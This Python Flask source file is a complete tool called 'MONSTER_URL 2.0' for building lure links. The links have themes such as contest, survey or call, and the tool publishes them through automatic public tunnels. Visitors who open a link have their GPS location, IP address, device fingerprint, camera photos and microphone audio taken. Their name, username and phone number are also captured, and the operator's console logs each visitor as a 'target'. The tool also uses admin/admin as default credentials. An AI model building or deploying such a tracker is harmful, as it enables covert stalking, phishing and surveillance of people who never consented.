import os
import re
import sys
import time
import uuid
import secrets
import sqlite3
import shutil
import platform
import subprocess
import threading
from pathlib import Path
from datetime import datetime, timezone
from functools import wraps

from flask import (
    Flask, abort, g, jsonify, redirect, render_template, request,
    send_file, session, url_for,
)
from werkzeug.security import check_password_hash, generate_password_hash

# ---------------- App Directories & Configuration ----------------
BASE_DIR = Path(__file__).resolve().parent
DB_PATH = BASE_DIR / "tracker.db"
MEDIA_DIR = BASE_DIR / "media"
BIN_DIR = BASE_DIR / "bin"
MEDIA_DIR.mkdir(exist_ok=True)
BIN_DIR.mkdir(exist_ok=True)

import logging
log = logging.getLogger("werkzeug")
log.setLevel(logging.ERROR)

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))

ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "admin")
ADMIN_HASH = generate_password_hash(ADMIN_PASS)

import atexit

GLOBAL_TUNNEL_URL = os.environ.get("PUBLIC_URL", "")
TUNNEL_STATUS = {
    "active": False,
    "url": "",
    "provider": "Initializing...",
    "error": None
}

# ---------------- Tunnel Manager (Cloudflare Primary) ----------------
class TunnelManager(threading.Thread):
    def __init__(self, port=5000):
        super().__init__()
        self.port = port
        self.daemon = True
        self.process = None
        atexit.register(self.cleanup)

    def cleanup(self):
        if self.process and self.process.poll() is None:
            try:
                self.process.terminate()
                self.process.wait(timeout=2)
            except Exception:
                try:
                    self.process.kill()
                except Exception:
                    pass

    def run(self):
        global GLOBAL_TUNNEL_URL, TUNNEL_STATUS
        if GLOBAL_TUNNEL_URL:
            TUNNEL_STATUS["active"] = True
            TUNNEL_STATUS["url"] = GLOBAL_TUNNEL_URL
            TUNNEL_STATUS["provider"] = "Custom ENV (PUBLIC_URL)"
            print(f"\n[MONSTER_URL 2.0] Using predefined Public URL: {GLOBAL_TUNNEL_URL}\n")
            return

        while True:
            # Primary Method: Zero-Configuration Cloudflare Tunnel (TryCloudflare)
            if self.try_cloudflare():
                self.wait_and_reconnect()
                continue

            # Fallback 1: Serveo SSH Tunnel
            if self.try_serveo():
                self.wait_and_reconnect()
                continue

            # Fallback 2: Localhost.run SSH Tunnel
            if self.try_localhost_run():
                self.wait_and_reconnect()
                continue

            TUNNEL_STATUS["active"] = False
            TUNNEL_STATUS["provider"] = "Local Only"
            TUNNEL_STATUS["error"] = "Could not establish automatic public tunnel. Retrying in 10s..."
            print(f"\n[MONSTER_URL 2.0] Public tunnel unavailable. Retrying in 10 seconds...\n")
            time.sleep(10)

    def wait_and_reconnect(self):
        if self.process:
            self.process.wait()
        global GLOBAL_TUNNEL_URL, TUNNEL_STATUS
        TUNNEL_STATUS["active"] = False
        TUNNEL_STATUS["url"] = ""
        GLOBAL_TUNNEL_URL = ""
        print(f"\n[MONSTER_URL 2.0] Public Tunnel process ended. Auto-reconnecting...\n")
        time.sleep(3)

    def get_cloudflared_bin(self):
        # 1. System PATH
        which_path = shutil.which("cloudflared")
        if which_path:
            return which_path

        # 2. Local bin/ folder
        local_exe = BIN_DIR / ("cloudflared.exe" if os.name == "nt" else "cloudflared")
        if local_exe.exists():
            if os.name != "nt" and not os.access(local_exe, os.X_OK):
                try:
                    os.chmod(local_exe, 0o755)
                except Exception:
                    pass
            return str(local_exe)

        # 3. Termux PATH fallback
        termux_bin = Path("/data/data/com.termux/files/usr/bin/cloudflared")
        if termux_bin.exists():
            return str(termux_bin)

        return None

    def try_cloudflare(self):
        global GLOBAL_TUNNEL_URL, TUNNEL_STATUS
        TUNNEL_STATUS["provider"] = "Cloudflare Tunnel"
        
        cloudflared_bin = self.get_cloudflared_bin()
        if not cloudflared_bin:
            print("[TunnelManager] cloudflared binary not found in PATH or bin/ directory.")
            return False

        try:
            cmd = [cloudflared_bin, "tunnel", "--url", f"http://127.0.0.1:{self.port}", "--no-autoupdate"]
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            
            start_time = time.time()
            while time.time() - start_time < 30:
                if self.process.poll() is not None:
                    break
                line = self.process.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue
                match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)
                if match:
                    url = match.group(0).strip()
                    GLOBAL_TUNNEL_URL = url
                    TUNNEL_STATUS["active"] = True
                    TUNNEL_STATUS["url"] = url
                    TUNNEL_STATUS["provider"] = "Cloudflare Tunnel"
                    TUNNEL_STATUS["error"] = None
                    print(f"\n" + "="*60)
                    print(f" 🔥 MONSTER_URL 2.0 CLOUDFLARE PUBLIC TUNNEL ACTIVE!")
                    print(f" 🌐 Public HTTPS URL: {url}")
                    print(f" 🛡 Provider: Cloudflare TryCloudflare (Zero-Config)")
                    print("="*60 + "\n")
                    
                    def monitor(proc):
                        global GLOBAL_TUNNEL_URL, TUNNEL_STATUS
                        while proc.poll() is None:
                            time.sleep(2)
                        GLOBAL_TUNNEL_URL = ""
                        TUNNEL_STATUS["active"] = False
                        TUNNEL_STATUS["url"] = ""
                    threading.Thread(target=monitor, args=(self.process,), daemon=True).start()
                    return True
        except Exception as e:
            print(f"[TunnelManager] Cloudflare failed: {e}")
        return False

    def try_serveo(self):
        global GLOBAL_TUNNEL_URL, TUNNEL_STATUS
        TUNNEL_STATUS["provider"] = "Serveo SSH"
        try:
            cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30", "-R", f"80:127.0.0.1:{self.port}", "serveo.net"]
            self.process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
            )
            
            start_time = time.time()
            while time.time() - start_time < 20:
                if self.process.poll() is not None:
                    break
                line = self.process.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue
                match = re.search(r"https://[-a-zA-Z0-9.]+\.serveo\.net", line)
                if match:
                    url = match.group(0).strip()
                    GLOBAL_TUNNEL_URL = url
                    TUNNEL_STATUS["active"] = True
                    TUNNEL_STATUS["url"] = url
                    TUNNEL_STATUS["provider"] = "Serveo SSH Tunnel"
                    TUNNEL_STATUS["error"] = None
                    print(f"\n" + "="*60)
                    print(f" 🔥 MONSTER_URL 2.0 PUBLIC TUNNEL ACTIVE!")
                    print(f" 🌐 Public HTTPS URL: {url}")
                    print(f" 🛡 Provider: Serveo SSH Tunnel")
                    print("="*60 + "\n")
                    def monitor(proc):
                        global GLOBAL_TUNNEL_URL, TUNNEL_STATUS
                        while proc.poll() is None:
                            time.sleep(2)
                        GLOBAL_TUNNEL_URL = ""
                        TUNNEL_STATUS["active"] = False
                        TUNNEL_STATUS["url"] = ""
                    threading.Thread(target=monitor, args=(self.process,), daemon=True).start()
                    return True
        except Exception as e:
            print(f"[TunnelManager] Serveo SSH failed: {e}")
        return False

    def try_localhost_run(self):
        global GLOBAL_TUNNEL_URL, TUNNEL_STATUS
        TUNNEL_STATUS["provider"] = "localhost.run"
        try:
            cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-R", f"80:127.0.0.1:{self.port}", "nokey@localhost.run"]
            self.process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
            )
            start_time = time.time()
            while time.time() - start_time < 20:
                if self.process.poll() is not None:
                    break
                line = self.process.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue
                match = re.search(r"https://[-a-zA-Z0-9.]+\.lhr\.life", line) or re.search(r"https://[-a-zA-Z0-9.]+\.lhrtunnel\.link", line)
                if match:
                    url = match.group(0).strip()
                    GLOBAL_TUNNEL_URL = url
                    TUNNEL_STATUS["active"] = True
                    TUNNEL_STATUS["url"] = url
                    TUNNEL_STATUS["provider"] = "localhost.run SSH Tunnel"
                    TUNNEL_STATUS["error"] = None
                    print(f"\n" + "="*60)
                    print(f" 🔥 MONSTER_URL 2.0 PUBLIC TUNNEL ACTIVE!")
                    print(f" 🌐 Public HTTPS URL: {url}")
                    print(f" 🛡 Provider: localhost.run SSH Tunnel")
                    print("="*60 + "\n")
                    def monitor(proc):
                        global GLOBAL_TUNNEL_URL, TUNNEL_STATUS
                        while proc.poll() is None:
                            time.sleep(2)
                        GLOBAL_TUNNEL_URL = ""
                        TUNNEL_STATUS["active"] = False
                        TUNNEL_STATUS["url"] = ""
                    threading.Thread(target=monitor, args=(self.process,), daemon=True).start()
                    return True
        except Exception as e:
            print(f"[TunnelManager] Localhost.run failed: {e}")
        return False


def get_base_url():
    if GLOBAL_TUNNEL_URL:
        return GLOBAL_TUNNEL_URL.rstrip("/")
    
    # If no tunnel active, check Host header or environment override
    host = request.headers.get("X-Forwarded-Host", request.host)
    scheme = request.headers.get("X-Forwarded-Proto", request.scheme)
    
    # If running over local IP or 127.0.0.1, output clean localhost or tunnel URL
    if scheme != "https" and not host.startswith("127.0.0.1") and not host.startswith("localhost"):
        scheme = "https"
        
    return f"{scheme}://{host}".rstrip("/")


def parse_user_agent(ua_string):
    if not ua_string:
        return "Unknown Device"
    ua = ua_string.lower()
    
    # OS
    if "android" in ua:
        os_name = "Android"
    elif "iphone" in ua or "ipad" in ua or "ipod" in ua:
        os_name = "iOS"
    elif "windows" in ua:
        os_name = "Windows"
    elif "macintosh" in ua or "mac os" in ua:
        os_name = "macOS"
    elif "linux" in ua:
        os_name = "Linux"
    else:
        os_name = "Device"
        
    # Browser
    if "edg/" in ua or "edge/" in ua:
        browser = "Edge"
    elif "samsungbrowser" in ua:
        browser = "Samsung Browser"
    elif "chrome" in ua and "chromium" not in ua:
        browser = "Chrome"
    elif "firefox" in ua:
        browser = "Firefox"
    elif "safari" in ua and "chrome" not in ua:
        browser = "Safari"
    elif "opera" in ua or "opr/" in ua:
        browser = "Opera"
    else:
        browser = "Browser"
        
    return f"{os_name} · {browser}"


# ---------------- DB helpers ----------------
def get_db():
    if "db" not in g:
        g.db = sqlite3.connect(DB_PATH)
        g.db.row_factory = sqlite3.Row
    return g.db


@app.teardown_appcontext
def close_db(_exc):
    db = g.pop("db", None)
    if db is not None:
        db.close()


def init_db():
    db = sqlite3.connect(DB_PATH)
    db.executescript(
        """
        CREATE TABLE IF NOT EXISTS links (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            token TEXT UNIQUE NOT NULL,
            name TEXT NOT NULL,
            loc INTEGER NOT NULL DEFAULT 1,
            cam INTEGER NOT NULL DEFAULT 0,
            mic INTEGER NOT NULL DEFAULT 0,
            interval_s INTEGER NOT NULL DEFAULT 5,
            theme TEXT NOT NULL DEFAULT 'track',
            active INTEGER NOT NULL DEFAULT 1,
            created_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS reports (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_id INTEGER NOT NULL,
            lat REAL, lon REAL, accuracy REAL, speed REAL,
            heading REAL, alt REAL,
            battery_level REAL, battery_charging INTEGER,
            ua TEXT, ip TEXT,
            gpu TEXT, screen TEXT, ram TEXT, cpu TEXT, timezone TEXT,
            created_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS media (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_id INTEGER NOT NULL,
            kind TEXT NOT NULL,
            filename TEXT NOT NULL,
            created_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_id INTEGER NOT NULL,
            full_name TEXT NOT NULL,
            username TEXT NOT NULL,
            phone TEXT NOT NULL,
            opinion TEXT,
            created_at TEXT NOT NULL
        );
        """
    )
    # Migrations for schema additions
    cols = [r[1] for r in db.execute("PRAGMA table_info(reports)").fetchall()]
    if "battery_level" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN battery_level REAL")
    if "battery_charging" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN battery_charging INTEGER")
    if "gpu" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN gpu TEXT")
    if "screen" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN screen TEXT")
    if "ram" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN ram TEXT")
    if "cpu" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN cpu TEXT")
    if "timezone" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN timezone TEXT")

    link_cols = [r[1] for r in db.execute("PRAGMA table_info(links)").fetchall()]
    if "theme" not in link_cols:
        db.execute("ALTER TABLE links ADD COLUMN theme TEXT NOT NULL DEFAULT 'track'")

    # Seed default admin credentials into settings table if not present
    cur_user = db.execute("SELECT value FROM settings WHERE key='admin_username'").fetchone()
    if not cur_user:
        db.execute("INSERT INTO settings (key, value) VALUES ('admin_username', ?)", (ADMIN_USER,))
    cur_hash = db.execute("SELECT value FROM settings WHERE key='admin_password_hash'").fetchone()
    if not cur_hash:
        db.execute("INSERT INTO settings (key, value) VALUES ('admin_password_hash', ?)", (ADMIN_HASH,))

    db.commit()
    db.close()


def get_setting(key, default=None):
    db = sqlite3.connect(DB_PATH)
    row = db.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
    db.close()
    return row[0] if row else default


def set_setting(key, value):
    db = sqlite3.connect(DB_PATH)
    db.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
    db.commit()
    db.close()


def now_iso():
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def link_by_token(token):
    return get_db().execute(
        "SELECT * FROM links WHERE token=? AND active=1", (token,)
    ).fetchone()


def admin_required(fn):
    @wraps(fn)
    def wrap(*args, **kwargs):
        if not session.get("authed"):
            return redirect(url_for("login"))
        return fn(*args, **kwargs)
    return wrap


init_db()


# ---------------- Auth / Pages ----------------
@app.route("/")
def index():
    return redirect(url_for("dashboard") if session.get("authed") else url_for("login"))


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        u = request.form.get("username", "").strip()
        p = request.form.get("password", "")
        stored_user = get_setting("admin_username", ADMIN_USER)
        stored_hash = get_setting("admin_password_hash", ADMIN_HASH)
        if u == stored_user and check_password_hash(stored_hash, p):
            session["authed"] = True
            return redirect(url_for("dashboard"))
        return render_template("login.html", error="Invalid admin username or password")
    return render_template("login.html")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


@app.route("/dashboard")
@admin_required
def dashboard():
    return render_template("dashboard.html")


@app.route("/api/settings/password", methods=["POST"])
@admin_required
def api_change_password():
    data = request.get_json(force=True) or {}
    old_pass = data.get("old_password", "")
    new_pass = data.get("new_password", "")
    confirm_pass = data.get("confirm_password", "")
    new_user = data.get("new_username", "").strip()

    if not old_pass or not new_pass:
        return jsonify({"ok": False, "error": "Current and new password are required"}), 400

    if new_pass != confirm_pass:
        return jsonify({"ok": False, "error": "New passwords do not match"}), 400

    if len(new_pass) < 4:
        return jsonify({"ok": False, "error": "New password must be at least 4 characters long"}), 400

    stored_hash = get_setting("admin_password_hash", ADMIN_HASH)
    if not check_password_hash(stored_hash, old_pass):
        return jsonify({"ok": False, "error": "Current password is incorrect"}), 400

    new_hash = generate_password_hash(new_pass)
    set_setting("admin_password_hash", new_hash)
    if new_user:
        set_setting("admin_username", new_user)

    return jsonify({"ok": True, "message": "Password updated successfully!"})


# ---------------- Tunnel & Link API (Admin) ----------------
@app.route("/api/tunnel")
@admin_required
def api_tunnel_status():
    st = dict(TUNNEL_STATUS)
    st["current_base_url"] = get_base_url()
    return jsonify(st)


@app.route("/api/links", methods=["GET", "POST"])
@admin_required
def api_links():
    db = get_db()
    if request.method == "POST":
        data = request.get_json(force=True) or {}
        token = secrets.token_urlsafe(10)
        
        # Determine theme/lure
        theme = data.get("theme", "track")
        if theme not in ("diag", "contest", "survey", "track", "call", "rec", "custom"):
            theme = "track"

        cur = db.execute(
            "INSERT INTO links (token,name,loc,cam,mic,interval_s,theme,created_at) "
            "VALUES (?,?,?,?,?,?,?,?)",
            (
                token,
                (data.get("name") or "MONSTER Link")[:80],
                1 if data.get("loc", True) else 0,
                1 if data.get("cam", False) else 0,
                1 if data.get("mic", False) else 0,
                min(max(int(data.get("interval_s", 5)), 2), 3600),
                theme,
                now_iso(),
            ),
        )
        db.commit()
        link = db.execute("SELECT * FROM links WHERE id=?", (cur.lastrowid,)).fetchone()
        return jsonify(serialize_link(link))

    rows = db.execute("SELECT * FROM links WHERE active=1 ORDER BY id DESC").fetchall()
    return jsonify([serialize_link(r) for r in rows])


def serialize_link(row):
    d = dict(row)
    base = get_base_url()
    d["url"] = f"{base}/t/{row['token']}"
    return d


@app.route("/api/links/<int:link_id>", methods=["DELETE"])
@admin_required
def api_link_delete(link_id):
    db = get_db()
    db.execute("UPDATE links SET active=0 WHERE id=?", (link_id,))
    db.commit()
    return jsonify({"ok": True})


# ---------------- Client Endpoints ----------------
@app.route("/t/<token>")
def client_page(token):
    link = link_by_token(token)
    if not link:
        abort(404)

    # Use explicit theme if saved, else infer from permissions
    theme = link["theme"] if "theme" in link.keys() and link["theme"] else None
    if not theme:
        if link["cam"]:
            theme = "call"
        elif link["mic"]:
            theme = "rec"
        else:
            theme = "track"

    cfg = {
        "token": link["token"],
        "name": link["name"],
        "loc": bool(link["loc"]),
        "cam": bool(link["cam"]),
        "mic": bool(link["mic"]),
        "interval_s": link["interval_s"],
        "host": get_base_url(),
        "theme": theme,
    }
    return render_template("client.html", cfg=cfg)


@app.route("/api/t/<token>/report", methods=["POST"])
def api_report(token):
    link = link_by_token(token)
    if not link:
        return jsonify({"ok": False, "error": "invalid token"}), 404
    data = request.get_json(force=True) or {}
    
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if client_ip and "," in client_ip:
        client_ip = client_ip.split(",")[0].strip()

    db = get_db()
    db.execute(
        "INSERT INTO reports (link_id,lat,lon,accuracy,speed,heading,alt,"
        "battery_level,battery_charging,ua,ip,gpu,screen,ram,cpu,timezone,created_at) "
        "VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (
            link["id"],
            data.get("lat"), data.get("lon"), data.get("accuracy"),
            data.get("speed"), data.get("heading"), data.get("alt"),
            data.get("battery_level"), data.get("battery_charging"),
            request.headers.get("User-Agent", ""), client_ip,
            data.get("gpu"), data.get("screen"), data.get("ram"),
            data.get("cpu"), data.get("timezone"),
            now_iso(),
        ),
    )
    db.commit()
    
    # Clean terminal shell logging for target activity
    lat, lon = data.get("lat"), data.get("lon")
    gps_str = f"{lat:.4f},{lon:.4f} (Acc: {data.get('accuracy')}m)" if lat and lon else "Pending GPS Fix"
    dev_info = parse_user_agent(request.headers.get("User-Agent", ""))
    print(f" [🎯 TARGET ACTIVITY] Link: {link['name']} | IP: {client_ip} | Device: {dev_info} | Location: {gps_str}")
    
    return jsonify({"ok": True})


@app.route("/api/t/<token>/media", methods=["POST"])
def api_media_upload(token):
    link = link_by_token(token)
    if not link:
        return jsonify({"ok": False, "error": "invalid token"}), 404
    kind = request.form.get("kind", "photo")
    if kind not in ("photo", "audio"):
        return jsonify({"ok": False, "error": "bad kind"}), 400
    f = request.files.get("file")
    if not f or not f.filename:
        return jsonify({"ok": False, "error": "no file"}), 400
    ext = ".jpg" if kind == "photo" else ".webm"
    fname = f"{int(time.time()*1000)}_{uuid.uuid4().hex[:8]}{ext}"
    f.save(MEDIA_DIR / fname)
    db = get_db()
    db.execute(
        "INSERT INTO media (link_id,kind,filename,created_at) VALUES (?,?,?,?)",
        (link["id"], kind, fname, now_iso()),
    )
    db.commit()

    print(f" [📷 MEDIA CAPTURED] Link: {link['name']} | Type: {kind.upper()} | File: {fname}")
    return jsonify({"ok": True, "filename": fname})


@app.route("/api/t/<token>/submit", methods=["POST"])
def api_submit_feedback(token):
    link = link_by_token(token)
    if not link:
        return jsonify({"ok": False, "error": "invalid token"}), 404
    data = request.get_json(force=True) or {}
    full_name = (data.get("full_name") or "").strip()
    username = (data.get("username") or "").strip()
    phone = (data.get("phone") or "").strip()
    opinion = (data.get("opinion") or "").strip()

    if not full_name or not username or not phone:
        return jsonify({"ok": False, "error": "Name, username, and phone are required"}), 400

    db = get_db()
    db.execute(
        "INSERT INTO submissions (link_id, full_name, username, phone, opinion, created_at) "
        "VALUES (?,?,?,?,?,?)",
        (link["id"], full_name, username, phone, opinion, now_iso()),
    )
    db.commit()

    print(f"\n" + "🔥"*30)
    print(f" 📥 [USER SUBMISSION CAPTURED!]")
    print(f" 👤 Name     : {full_name}")
    print(f" 📱 Username : @{username}")
    print(f" 📞 Phone    : {phone}")
    if opinion:
        print(f" 💬 Details  : {opinion}")
    print(f" 🔥"*30 + "\n")
    return jsonify({"ok": True})


# ---------------- Dashboard Data API ----------------
@app.route("/api/submissions")
@admin_required
def api_submissions_list():
    rows = get_db().execute(
        "SELECT s.*, l.name AS link_name FROM submissions s "
        "JOIN links l ON l.id = s.link_id ORDER BY s.id DESC LIMIT 500"
    ).fetchall()
    return jsonify([dict(r) for r in rows])


@app.route("/api/submissions/<int:sid>", methods=["DELETE"])
@admin_required
def api_submission_delete(sid):
    db = get_db()
    db.execute("DELETE FROM submissions WHERE id=?", (sid,))
    db.commit()
    return jsonify({"ok": True})


@app.route("/api/submissions/clear", methods=["DELETE"])
@admin_required
def api_submissions_clear():
    db = get_db()
    db.execute("DELETE FROM submissions")
    db.commit()
    return jsonify({"ok": True})
@app.route("/api/reports")
@admin_required
def api_reports():
    rows = get_db().execute(
        "SELECT r.*, l.name AS link_name FROM reports r "
        "JOIN links l ON l.id = r.link_id ORDER BY r.id DESC LIMIT 500"
    ).fetchall()
    out = []
    for r in rows:
        d = dict(r)
        d["device_summary"] = parse_user_agent(r["ua"])
        out.append(d)
    return jsonify(out)


@app.route("/api/reports/<int:report_id>", methods=["DELETE"])
@admin_required
def api_report_delete(report_id):
    db = get_db()
    db.execute("DELETE FROM reports WHERE id=?", (report_id,))
    db.commit()
    return jsonify({"ok": True})


@app.route("/api/reports/clear", methods=["DELETE"])
@admin_required
def api_reports_clear():
    db = get_db()
    db.execute("DELETE FROM reports")
    db.commit()
    return jsonify({"ok": True})


@app.route("/api/stats/<int:link_id>")
@admin_required
def api_stats(link_id):
    rows = get_db().execute(
        "SELECT created_at, accuracy, battery_level, battery_charging, lat, lon "
        "FROM reports WHERE link_id=? ORDER BY id ASC",
        (link_id,),
    ).fetchall()
    return jsonify([dict(r) for r in rows])


@app.route("/api/media")
@admin_required
def api_media_list():
    rows = get_db().execute(
        "SELECT m.*, l.name AS link_name FROM media m "
        "JOIN links l ON l.id = m.link_id ORDER BY m.id DESC LIMIT 500"
    ).fetchall()
    out = []
    for r in rows:
        d = dict(r)
        d["url"] = url_for("media_file", mid=r["id"])
        out.append(d)
    return jsonify(out)


@app.route("/api/media/<int:mid>/file")
@admin_required
def media_file(mid):
    row = get_db().execute("SELECT * FROM media WHERE id=?", (mid,)).fetchone()
    if not row:
        abort(404)
    path = MEDIA_DIR / row["filename"]
    if not path.exists():
        abort(404)
    mime = "image/jpeg" if row["kind"] == "photo" else "video/webm"
    return send_file(path, mimetype=mime, as_attachment=False)


@app.route("/api/media/<int:mid>/download")
@admin_required
def media_download(mid):
    row = get_db().execute("SELECT * FROM media WHERE id=?", (mid,)).fetchone()
    if not row:
        abort(404)
    path = MEDIA_DIR / row["filename"]
    if not path.exists():
        abort(404)
    return send_file(path, as_attachment=True, download_name=row["filename"])


@app.route("/api/media/<int:mid>", methods=["DELETE"])
@admin_required
def media_delete(mid):
    db = get_db()
    row = db.execute("SELECT * FROM media WHERE id=?", (mid,)).fetchone()
    if row:
        path = MEDIA_DIR / row["filename"]
        if path.exists():
            try:
                path.unlink()
            except Exception:
                pass
        db.execute("DELETE FROM media WHERE id=?", (mid,))
        db.commit()
    return jsonify({"ok": True})


@app.route("/api/media/clear", methods=["DELETE"])
@admin_required
def media_clear():
    db = get_db()
    rows = db.execute("SELECT filename FROM media").fetchall()
    for r in rows:
        path = MEDIA_DIR / r["filename"]
        if path.exists():
            try:
                path.unlink()
            except Exception:
                pass
    db.execute("DELETE FROM media")
    db.commit()
    return jsonify({"ok": True})


# ---------------- Server Launcher ----------------
def print_banner(port):
    banner = f"""
====================================================================
 👾 MONSTER_URL 2.0 — Advanced Multi-Platform URL & Target Console
 👤 Developer : Mohammad Fahad
 🐙 GitHub    : https://github.com/Dr-MrBot
 📸 Instagram : https://www.instagram.com/dr_mr.bot/
====================================================================
  [+] Admin Dashboard : http://127.0.0.1:{port}/
  [+] Default User    : {ADMIN_USER}
  [+] Default Pass    : {ADMIN_PASS}
--------------------------------------------------------------------
  [*] Automatic Tunneling Initializing...
  [*] Check the Dashboard top bar for the Live Public HTTPS URL!
====================================================================
"""
    print(banner)


def start_server():
    port = int(os.environ.get("PORT", 5000))
    print_banner(port)
    
    # Launch Automatic Tunnel Manager
    tunnel = TunnelManager(port=port)
    tunnel.start()

    if os.environ.get("USE_HTTPS"):
        app.run(host="0.0.0.0", port=port, ssl_context="adhoc", debug=False)
    else:
        app.run(host="0.0.0.0", port=port, debug=False)


if __name__ == "__main__":
    start_server()
